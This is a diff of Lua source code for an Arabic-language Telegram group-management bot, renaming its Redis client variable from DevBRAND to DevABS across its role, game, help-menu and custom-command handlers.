-if DevBRAND:sismember(BRAND..'BRAND:Admins:'..data.chat_id_, data.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:Admins:'..data.chat_id_, data.sender_user_id_) then
 admins = 'الادمنيه • ' else admins = '' end
-if DevBRAND:sismember(BRAND..'BRAND:VipMem:'..data.chat_id_, data.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:VipMem:'..data.chat_id_, data.sender_user_id_) then
 vipmem = 'المميزين • ' else vipmem = '' end
-if DevBRAND:sismember(BRAND..'BRAND:Cleaner:'..data.chat_id_, data.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:Cleaner:'..data.chat_id_, data.sender_user_id_) then
 cleaner = 'المنظفين • ' else cleaner = '' end
-if DevBRAND:sismember(BRAND..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
+if DevABS:sismember(BRAND..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
 donky = 'المطايه • ' else donky = '' end
-if DevBRAND:sismember(BRAND..'BRAND:Constructor:'..data.chat_id_, data.sender_user_id_) or DevBRAND:sismember(BRAND..'BRAND:Managers:'..data.chat_id_, data.sender_user_id_) or DevBRAND:sismember(BRAND..'BRAND:Admins:'..data.chat_id_, data.sender_user_id_) or DevBRAND:sismember(BRAND..'BRAND:VipMem:'..data.chat_id_, data.sender_user_id_) or DevBRAND:sismember(BRAND..'BRAND:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevBRAND:sismember(BRAND..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
-DevBRAND:srem(BRAND..'BRAND:Constructor:'..data.chat_id_,data.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Managers:'..data.chat_id_,data.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Admins:'..data.chat_id_,data.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..data.chat_id_,data.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:Cleaner:'..data.chat_id_,data.sender_user_id_)
-DevBRAND:srem(BRAND..'User:Donky:'..data.chat_id_,data.sender_user_id_)
+if DevABS:sismember(BRAND..'BRAND:Constructor:'..data.chat_id_, data.sender_user_id_) or DevABS:sismember(BRAND..'BRAND:Managers:'..data.chat_id_, data.sender_user_id_) or DevABS:sismember(BRAND..'BRAND:Admins:'..data.chat_id_, data.sender_user_id_) or DevABS:sismember(BRAND..'BRAND:VipMem:'..data.chat_id_, data.sender_user_id_) or DevABS:sismember(BRAND..'BRAND:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevABS:sismember(BRAND..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
+DevABS:srem(BRAND..'BRAND:Constructor:'..data.chat_id_,data.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..data.chat_id_,data.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..data.chat_id_,data.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..data.chat_id_,data.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Cleaner:'..data.chat_id_,data.sender_user_id_)
+DevABS:srem(BRAND..'User:Donky:'..data.chat_id_,data.sender_user_id_)
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم تنزيلك من ↫ ⤈\n~ ( "..constructor..Managers..admins..vipmem..cleaner..donky.." ) ~ \n") 
 else 
 if IdRank(data.sender_user_id_, data.chat_id_) == 'العضو' then
@@ -915,14 +915,14 @@ EditMsg(Chat_Id2, Msg_Id2, "⌁︙لا استطيع تنزيل ↫ "..IdRank(dat
 end
 end
 end
-if DevBRAND:get(BRAND.."BRAND:NewDev"..data.sender_user_id_) then
+if DevABS:get(BRAND.."BRAND:NewDev"..data.sender_user_id_) then
 if DataText == '/setno' then
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء امر تغير المطور الاساسي") 
-DevBRAND:del(BRAND.."BRAND:NewDev"..data.sender_user_id_)
+DevABS:del(BRAND.."BRAND:NewDev"..data.sender_user_id_)
 return false
 end
 if DataText == '/setyes' then
-local NewDev = DevBRAND:get(BRAND.."BRAND:NewDev"..data.sender_user_id_)
+local NewDev = DevABS:get(BRAND.."BRAND:NewDev"..data.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = NewDev},function(arg,dp) 
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙المطور الجديد ↫ ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n⌁︙تم تغير المطور الاساسي بنجاح") 
 end,nil)
@@ -947,33 +947,33 @@ BRAND = TokenBot:match("(%d+)"),
 SudoIds = {NewDev},
 }
 Create(Config, "./config.lua")  
-DevBRAND:del(BRAND.."BRAND:NewDev"..data.sender_user_id_)
+DevABS:del(BRAND.."BRAND:NewDev"..data.sender_user_id_)
 dofile('BRAND.lua') 
 end
 end
-if DataText == '/nodel' and DevBRAND:get(BRAND..'nodel'..data.sender_user_id_) == 'delno' then
-DevBRAND:del(BRAND..'yesdel'..data.sender_user_id_, 'delyes')
-DevBRAND:del(BRAND..'nodel'..data.sender_user_id_, 'delno')
+if DataText == '/nodel' and DevABS:get(BRAND..'nodel'..data.sender_user_id_) == 'delno' then
+DevABS:del(BRAND..'yesdel'..data.sender_user_id_, 'delyes')
+DevABS:del(BRAND..'nodel'..data.sender_user_id_, 'delno')
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء امر نزلني") 
 end
-if DataText == '/YesRolet' and DevBRAND:get(BRAND.."BRAND:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
-local List = DevBRAND:smembers(BRAND..'BRAND:ListRolet'..data.chat_id_) 
+if DataText == '/YesRolet' and DevABS:get(BRAND.."BRAND:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
+local List = DevABS:smembers(BRAND..'BRAND:ListRolet'..data.chat_id_) 
 local UserName = List[math.random(#List)]
 tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
-DevBRAND:incrby(BRAND..'BRAND:GamesNumber'..data.chat_id_..dp.id_, 5) 
+DevABS:incrby(BRAND..'BRAND:GamesNumber'..data.chat_id_..dp.id_, 5) 
 end,nil) 
-DevBRAND:del(BRAND..'BRAND:ListRolet'..data.chat_id_) 
-DevBRAND:del(BRAND.."BRAND:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
+DevABS:del(BRAND..'BRAND:ListRolet'..data.chat_id_) 
+DevABS:del(BRAND.."BRAND:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙*صاحب الحظ* ↫ ["..UserName.."]\n⌁︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
 end
 if DataText == '/NoRolet' then
-DevBRAND:del(BRAND..'BRAND:ListRolet'..data.chat_id_) 
-DevBRAND:del(BRAND.."BRAND:NumRolet"..data.chat_id_..data.sender_user_id_) 
-DevBRAND:del(BRAND.."BRAND:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
+DevABS:del(BRAND..'BRAND:ListRolet'..data.chat_id_) 
+DevABS:del(BRAND.."BRAND:NumRolet"..data.chat_id_..data.sender_user_id_) 
+DevABS:del(BRAND.."BRAND:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء اللعبه لاعادة اللعب ارسل الالعاب") 
 end
 if DataText == '/ListRolet' then
-local List = DevBRAND:smembers(BRAND..'BRAND:ListRolet'..data.chat_id_) 
+local List = DevABS:smembers(BRAND..'BRAND:ListRolet'..data.chat_id_) 
 local Text = '⌁︙قائمة الاعبين ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n' 
 local Textt = '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تم اكتمال العدد الكلي هل انت مستعد ؟'
 for k, v in pairs(List) do 
@@ -984,9 +984,9 @@ keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="ل
 return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text..Textt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 if DataText == '/UnTkeed' then
-if DevBRAND:sismember(BRAND..'BRAND:Tkeed:'..Chat_Id2, data.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:Tkeed:'..Chat_Id2, data.sender_user_id_) then
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
-DevBRAND:srem(BRAND..'BRAND:Tkeed:'..Chat_Id2, data.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Tkeed:'..Chat_Id2, data.sender_user_id_)
 DeleteMessage(Chat_Id2,{[0] = MsgId2})
 return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ تم الغاء تقيدك من المجموعه بنجاح .")..'&show_alert=true')
 else
@@ -996,27 +996,27 @@ end
 if DataText and DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
 local Abbs = DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)')
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙الكلمه ↫ "..Abbs.." تم حذفها") 
-DevBRAND:del(BRAND..'BRAND:Text:GpTexts'..Abbs..data.chat_id_)
-DevBRAND:srem(BRAND..'BRAND:Manager:GpRedod'..data.chat_id_,Abbs)
+DevABS:del(BRAND..'BRAND:Text:GpTexts'..Abbs..data.chat_id_)
+DevABS:srem(BRAND..'BRAND:Manager:GpRedod'..data.chat_id_,Abbs)
 end
 if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
 local Abbs = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
-local List = DevBRAND:smembers(BRAND..'BRAND:Text:GpTexts'..Abbs..data.chat_id_)
-if DevBRAND:get(BRAND..'BRAND:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
+local List = DevABS:smembers(BRAND..'BRAND:Text:GpTexts'..Abbs..data.chat_id_)
+if DevABS:get(BRAND..'BRAND:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..Abbs) 
-DevBRAND:del(BRAND..'BRAND:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
+DevABS:del(BRAND..'BRAND:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
 else
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙عذرا صلاحية الامر منتهيه !") 
 end
 end
 if DataText and DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
 local Abbs = DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)')
-if DevBRAND:get(BRAND..'BRAND:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..Abbs) 
-DevBRAND:del(BRAND..'BRAND:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Text:GpTexts'..Abbs..data.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
-DevBRAND:srem(BRAND..'BRAND:Manager:GpRedod'..data.chat_id_,Abbs)
+DevABS:del(BRAND..'BRAND:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
+DevABS:del(BRAND..'BRAND:Text:GpTexts'..Abbs..data.chat_id_)
+DevABS:del(BRAND..'BRAND:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
+DevABS:srem(BRAND..'BRAND:Manager:GpRedod'..data.chat_id_,Abbs)
 else
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙عذرا صلاحية الامر منتهيه !") 
 end
@@ -1032,7 +1032,7 @@ end
 if DataText and DataText:match('/HelpList:(.*)') then
 local Abbs = DataText:match('/HelpList:(.*)')
 if tonumber(Abbs) == tonumber(data.sender_user_id_) then
-local Help = DevBRAND:get(BRAND..'BRAND:Help')
+local Help = DevABS:get(BRAND..'BRAND:Help')
 local Text = [[
 ⌁︙اهلا بك في قائمة الاوامر ↫ ⤈ 
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -1058,7 +1058,7 @@ if tonumber(Abbs) == tonumber(data.sender_user_id_) then
 if not Admin(data) then
 return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
 end
-local Help = DevBRAND:get(BRAND..'BRAND:Help1')
+local Help = DevABS:get(BRAND..'BRAND:Help1')
 local Text = [[
 ⌁︙اوامر حماية المجموعه ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -1120,7 +1120,7 @@ if tonumber(Abbs) == tonumber(data.sender_user_id_) then
 if not Admin(data) then
 return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
 end
-local Help = DevBRAND:get(BRAND..'BRAND:Help2')
+local Help = DevABS:get(BRAND..'BRAND:Help2')
 local Text = [[
 ⌁︙اوامر الادمنيه ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -1190,7 +1190,7 @@ if tonumber(Abbs) == tonumber(data.sender_user_id_) then
 if not Admin(data) then
 return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
 end
-local Help = DevBRAND:get(BRAND..'BRAND:Help3')
+local Help = DevABS:get(BRAND..'BRAND:Help3')
 local Text = [[
 ⌁︙اوامر المدراء ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -1249,7 +1249,7 @@ if tonumber(Abbs) == tonumber(data.sender_user_id_) then
 if not Admin(data) then
 return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
 end
-local Help = DevBRAND:get(BRAND..'BRAND:Help4')
+local Help = DevABS:get(BRAND..'BRAND:Help4')
 local Text = [[
 ⌁︙اوامر المنشئين ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -1302,7 +1302,7 @@ if tonumber(Abbs) == tonumber(data.sender_user_id_) then
 if not Admin(data) then
 return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
 end
-local Help = DevBRAND:get(BRAND..'BRAND:Help5')
+local Help = DevABS:get(BRAND..'BRAND:Help5')
 local Text = [[
 ⌁︙اوامر المطورين ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -1379,7 +1379,7 @@ end
 if DataText and DataText:match('/HelpList6:(.*)') then
 local Abbs = DataText:match('/HelpList6:(.*)')
 if tonumber(Abbs) == tonumber(data.sender_user_id_) then
-local Help = DevBRAND:get(BRAND..'BRAND:Help6')
+local Help = DevABS:get(BRAND..'BRAND:Help6')
 local Text = [[
 ⌁︙اوامر الاعضاء ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -1422,49 +1422,49 @@ end
 if (data.ID == "UpdateNewMessage") then
 local msg = data.message_
 text = msg.content_.text_ 
-if text and DevBRAND:get(BRAND.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
-local NewCmmd = DevBRAND:get(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
+if text and DevABS:get(BRAND.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
+local NewCmmd = DevABS:get(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
 if NewCmmd then
-DevBRAND:del(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
-DevBRAND:del(BRAND.."Set:Cmd:Group:New"..msg.chat_id_)
-DevBRAND:srem(BRAND.."List:Cmd:Group:New"..msg.chat_id_,text)
+DevABS:del(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
+DevABS:del(BRAND.."Set:Cmd:Group:New"..msg.chat_id_)
+DevABS:srem(BRAND.."List:Cmd:Group:New"..msg.chat_id_,text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الامر من المجموعه", 1, 'html')  
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙لايوجد امر بهذا الاسم", 1, 'html')
 end
-DevBRAND:del(BRAND.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
+DevABS:del(BRAND.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
 return false
 end
-if text and text:match('^'..(DevBRAND:get(BRAND..'BRAND:NameBot') or "بروكس")..' ') then
-data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevBRAND:get(BRAND..'BRAND:NameBot') or "بروكس")..' ','')
+if text and text:match('^'..(DevABS:get(BRAND..'BRAND:NameBot') or "بروكس")..' ') then
+data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevABS:get(BRAND..'BRAND:NameBot') or "بروكس")..' ','')
 end
 if data.message_.content_.text_ then
-local NewCmmd = DevBRAND:get(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
+local NewCmmd = DevABS:get(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
 if NewCmmd then
 data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
 end
 end
-if text and DevBRAND:get(BRAND.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
-DevBRAND:set(BRAND.."Set:Cmd:Group:New"..msg.chat_id_,text)
+if text and DevABS:get(BRAND.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
+DevABS:set(BRAND.."Set:Cmd:Group:New"..msg.chat_id_,text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر الجديد", 1, 'html')
-DevBRAND:del(BRAND.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
-DevBRAND:set(BRAND.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
+DevABS:del(BRAND.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
+DevABS:set(BRAND.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
 return false
 end
-if text and DevBRAND:get(BRAND.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
-local NewCmd = DevBRAND:get(BRAND.."Set:Cmd:Group:New"..msg.chat_id_)
-DevBRAND:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
-DevBRAND:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,text)
+if text and DevABS:get(BRAND.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
+local NewCmd = DevABS:get(BRAND.."Set:Cmd:Group:New"..msg.chat_id_)
+DevABS:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
+DevABS:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الامر", 1, 'html')
-DevBRAND:del(BRAND.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
+DevABS:del(BRAND.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
 return false
 end
 if Constructor(msg) then
 if text == "الاوامر المضافه" and ChCheck(msg) then
-local List = DevBRAND:smembers(BRAND.."List:Cmd:Group:New"..msg.chat_id_.."") 
+local List = DevABS:smembers(BRAND.."List:Cmd:Group:New"..msg.chat_id_.."") 
 t = "⌁︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-Cmds = DevBRAND:get(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
+Cmds = DevABS:get(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
 if Cmds then 
 t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
 else
@@ -1477,55 +1477,55 @@ end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, t, 1, 'html')
 end
 if text == "حذف الاوامر المضافه" or text == "حذف الاوامر" or text == "مسح الاوامر المضافه" and ChCheck(msg) then
-local List = DevBRAND:smembers(BRAND.."List:Cmd:Group:New"..msg.chat_id_)
+local List = DevABS:smembers(BRAND.."List:Cmd:Group:New"..msg.chat_id_)
 for k,v in pairs(List) do
-DevBRAND:del(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
-DevBRAND:del(BRAND.."List:Cmd:Group:New"..msg.chat_id_)
+DevABS:del(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
+DevABS:del(BRAND.."List:Cmd:Group:New"..msg.chat_id_)
 end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الاوامر المضافه في المجموعه", 1, 'html')
 end
 if text == "ترتيب الاوامر" then
-DevBRAND:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
-DevBRAND:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"ا")
-DevBRAND:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
-DevBRAND:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"تك")
-DevBRAND:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
-DevBRAND:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"م")
-DevBRAND:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
-DevBRAND:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"اد")
-DevBRAND:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
-DevBRAND:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"مد")
-DevBRAND:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
-DevBRAND:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"من")
-DevBRAND:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
-DevBRAND:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"اس")
-DevBRAND:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
-DevBRAND:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
-DevBRAND:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
-DevBRAND:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
+DevABS:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
+DevABS:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"ا")
+DevABS:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
+DevABS:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"تك")
+DevABS:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
+DevABS:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"م")
+DevABS:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
+DevABS:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"اد")
+DevABS:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
+DevABS:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"مد")
+DevABS:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
+DevABS:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"من")
+DevABS:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
+DevABS:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"اس")
+DevABS:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
+DevABS:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
+DevABS:set(BRAND.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
+DevABS:sadd(BRAND.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
 send(msg.chat_id_, msg.id_,"⌁︙تم ترتيب الاوامر بالشكل التالي ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙ايدي ↫ ا\n⌁︙تنزيل الكل ↫ تك\n⌁︙رفع مميز ↫ م\n⌁︙رفع ادمن ↫ اد \n⌁︙رفع مدير ↫ مد \n⌁︙رفع منشئ ↫ من \n⌁︙رفع منشئ اساسي ↫ اس  \n⌁︙تفعيل الايدي بالصوره ↫ تفع\n⌁︙تعطيل الايدي بالصوره ↫ تعط\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉")  
 end
 if text == "اضف امر" or text == "اضافة امر" or text == "اضافه امر" and ChCheck(msg) then
-DevBRAND:set(BRAND.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
+DevABS:set(BRAND.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر القديم", 1, 'html')
 return false
 end
 if text == "حذف امر" or text == "مسح امر" and ChCheck(msg) then 
-DevBRAND:set(BRAND.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
+DevABS:set(BRAND.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر الذي قمت باضافته يدويا", 1, 'html')
 return false
 end
 end
 --     Source BRAND     --
 if text == "الصلاحيات" or text == "صلاحيات" and ChCheck(msg) then 
-local List = DevBRAND:smembers(BRAND.."Coomds"..msg.chat_id_)
+local List = DevABS:smembers(BRAND.."Coomds"..msg.chat_id_)
 if #List == 0 then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد صلاحيات مضافه", 1, 'html')
 return false
 end
 t = "⌁︙قائمة الصلاحيات المضافه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-var = DevBRAND:get(BRAND.."Comd:New:rt:BRAND:"..v..msg.chat_id_)
+var = DevABS:get(BRAND.."Comd:New:rt:BRAND:"..v..msg.chat_id_)
 if var then
 t = t..k.."~ "..v.." • ("..var..")\n"
 else
@@ -1536,30 +1536,30 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, t, 1, 'html')
 end
 if Admin(msg) then
 if text == "حذف الصلاحيات" and ChCheck(msg) or text == "مسح الصلاحيات" and ChCheck(msg) then
-local List = DevBRAND:smembers(BRAND.."Coomds"..msg.chat_id_)
+local List = DevABS:smembers(BRAND.."Coomds"..msg.chat_id_)
 for k,v in pairs(List) do
-DevBRAND:del(BRAND.."Comd:New:rt:BRAND:"..v..msg.chat_id_)
-DevBRAND:del(BRAND.."Coomds"..msg.chat_id_)
+DevABS:del(BRAND.."Comd:New:rt:BRAND:"..v..msg.chat_id_)
+DevABS:del(BRAND.."Coomds"..msg.chat_id_)
 end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الصلاحيات المضافه", 1, 'html')
 end
 end
 if text and text:match("^اضف صلاحيه (.*)$") and ChCheck(msg) then 
 ComdNew = text:match("^اضف صلاحيه (.*)$")
-DevBRAND:set(BRAND.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
-DevBRAND:sadd(BRAND.."Coomds"..msg.chat_id_,ComdNew)  
-DevBRAND:setex(BRAND.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
+DevABS:set(BRAND.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
+DevABS:sadd(BRAND.."Coomds"..msg.chat_id_,ComdNew)  
+DevABS:setex(BRAND.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
